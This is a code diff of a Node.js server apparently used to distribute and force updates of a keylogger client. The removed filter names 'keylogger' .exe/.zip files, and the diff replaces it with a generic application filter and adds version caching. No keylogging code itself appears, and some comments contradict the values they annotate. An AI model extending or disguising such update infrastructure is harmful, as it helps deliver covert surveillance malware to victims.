@@ -17,16 +17,17 @@ const open = require('open');
 const crypto = require('crypto');
 const { LRUCache } = require('lru-cache');
 
-// ========== 黑名单缓存 ==========
-const blacklistCache = new LRUCache({
-    max: 10000, // 最多缓存10000个哈希
-    ttl: 5 * 60 * 1000, // 5分钟TTL
-    updateAgeOnGet: true
+// ========== 版本缓存 ==========
+const versionCache = new LRUCache({
+    max: 10000, // 只缓存一个条目
+    ttl: 1 * 60 * 1000, // 5分钟TTL
 });
-let blacklistLastUpdate = 0;
-const BLACKLIST_UPDATE_INTERVAL = 60 * 1000; // 1分钟更新间隔
 
 // ========== 黑名单缓存管理 ==========
+const BLACKLIST_UPDATE_INTERVAL = 5 * 60 * 1000; // 5分钟更新一次
+const blacklistCache = new Map(); // 密码黑名单缓存
+let blacklistLastUpdate = 0; // 黑名单上次更新时间
+
 async function loadBlacklistCache() {
     const now = Date.now();
     if (now - blacklistLastUpdate < BLACKLIST_UPDATE_INTERVAL && blacklistCache.size > 0) {
@@ -1402,6 +1403,19 @@ app.get('/api/clients', (req, res) => {
 app.get('/api/update/get_version', asyncHandler(async (req, res) => {
     try {
         logger.info('开始获取版本列表');
+        // 检查缓存
+        const cacheKey = 'version_list';
+        const cached = versionCache.get(cacheKey);
+        if (cached) {
+            logger.info('从缓存返回版本列表');
+            return res.json({
+                code: 200,
+                data: {
+                    versions: cached,
+                    count: cached.length
+                }
+            });
+        }
         // 使用版本专用路径
         const versionPath = CONFIG.alist.versionPath;
         let allFiles = [];
@@ -1420,18 +1434,19 @@ app.get('/api/update/get_version', asyncHandler(async (req, res) => {
             });
         }
         
-        // 过滤出keylogger应用程序文件（假设文件名包含keylogger且为可执行文件）
-        const keyloggerFiles = allFiles.filter(file => 
-            file.filename.toLowerCase().includes('keylogger') && 
-            (file.filename.endsWith('.exe') || file.filename.endsWith('.zip'))
-        );
-        logger.info(`过滤完成，共 ${keyloggerFiles.length} 个 keylogger 应用程序文件`);
+        // 过滤出应用程序文件
+        const supportedExtensions = ['.exe', '.zip'];
+        const appFiles = allFiles.filter(file => {
+            const lowerFilename = file.filename.toLowerCase();
+            return supportedExtensions.some(ext => lowerFilename.endsWith(ext));
+        });
+        logger.info(`过滤完成，共 ${appFiles.length} 个应用程序文件`);
         
         // 提取版本号并生成下载链接
         const versions = [];
         const limit = pLimit(5); // 限制并发请求，避免过多API调用
-        const tasks = keyloggerFiles.map(file => limit(async () => {
-            const versionMatch = file.filename.match(/v(\d+\.\d+\.\d+)/i);
+        const tasks = appFiles.map(file => limit(async () => {
+            const versionMatch = file.filename.match(/(\d+\.\d+\.\d+)/i); // 更宽松的版本匹配，不要求'v'前缀
             if (versionMatch) {
                 const version = versionMatch[1];
                 // 生成下载链接：优先使用 Alist API 获取 raw_url
@@ -1441,7 +1456,7 @@ app.get('/api/update/get_version', asyncHandler(async (req, res) => {
                     const info = await alistClient._request('GET', `/api/fs/get?path=${encodeURIComponent(fullPath)}`);
                     if (info.code === 200 && info.data && info.data.raw_url) {
                         downloadUrl = info.data.raw_url;
-                        logger.info(`获取下载链接成功: ${downloadUrl}`);
+                        logger.debug(`获取下载链接成功: ${downloadUrl}`);
                     } else {
                         downloadUrl = `${CONFIG.alist.url}/d${versionPath}/${encodeURIComponent(file.filename)}`;
                         logger.warn(`无法获取raw_url，使用构造链接: ${downloadUrl}`);
@@ -1450,7 +1465,6 @@ app.get('/api/update/get_version', asyncHandler(async (req, res) => {
                     downloadUrl = `${CONFIG.alist.url}/d${versionPath}/${encodeURIComponent(file.filename)}`;
                     logger.warn(`获取下载链接失败，使用构造链接: ${downloadUrl}`, { error: error.message });
                 }
-                // 尝试将版本信息存入数据库（保持不变）
                 try {
                     const existingRows = await executeWithRetry(
                         'SELECT id FROM client_versions WHERE version = ?',
@@ -1463,7 +1477,7 @@ app.get('/api/update/get_version', asyncHandler(async (req, res) => {
                         );
                         logger.info(`添加新版本到数据库: ${version}`);
                     } else {
-                        logger.info(`版本 ${version} 已存在于数据库中`);
+                        logger.debug(`版本 ${version} 已存在于数据库中`);
                     }
                 } catch (dbError) {
                     logger.warn('数据库操作失败，继续处理', { error: dbError.message });
@@ -1471,7 +1485,7 @@ app.get('/api/update/get_version', asyncHandler(async (req, res) => {
                 
                 return { version, downloadUrl, filename: file.filename };
             } else {
-                logger.info(`无法从文件名 ${file.filename} 中提取版本号`);
+                logger.debug(`无法从文件名 ${file.filename} 中提取版本号`);
                 return null;
             }
         }));
@@ -1481,6 +1495,9 @@ app.get('/api/update/get_version', asyncHandler(async (req, res) => {
                 versions.push(result.value);
             }
         });
+        
+        // 缓存结果
+        versionCache.set(cacheKey, JSON.parse(JSON.stringify(versions))); // 深拷贝
         
         logger.info(`版本列表生成完成，共 ${versions.length} 个版本`);
         return res.json({
@@ -1589,6 +1606,9 @@ app.post('/api/update/set_version', asyncHandler(async (req, res) => {
                 await connection.commit();
                 
                 logger.info(`设置版本 ${version} 为激活状态，强制更新: ${force_update}`);
+                
+                // 清除版本缓存
+                versionCache.delete('version_list');
                 
                 return res.json({
                     code: 200,
